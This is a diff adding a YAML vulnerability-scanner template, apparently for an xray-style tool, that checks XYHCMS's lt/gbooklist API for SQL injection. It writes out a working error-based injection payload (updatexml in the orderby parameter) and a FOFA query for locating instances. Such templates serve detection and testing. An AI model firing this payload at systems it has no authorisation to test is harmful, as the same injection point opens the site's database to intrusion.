@@ -1,0 +1,20 @@
+id: poc-yaml-xyhcms-api-gbooklist-sqli
+info:
+  name: 行云海CMS lt/gbooklist SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 行云海CMS
+  fofa: app="XYHCMS"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: GET
+  path: /index.php?s=Api/lt/gbooklist&orderby=(updatexml(1,concat(0x7e,(select%20md5({{.t1}})),0x7e),1))=1
+  expression: 'contains(body,"XPATH syntax error") &&
+
+    contains(body,substr(t2,0,31))
+
+    '
+transport: http
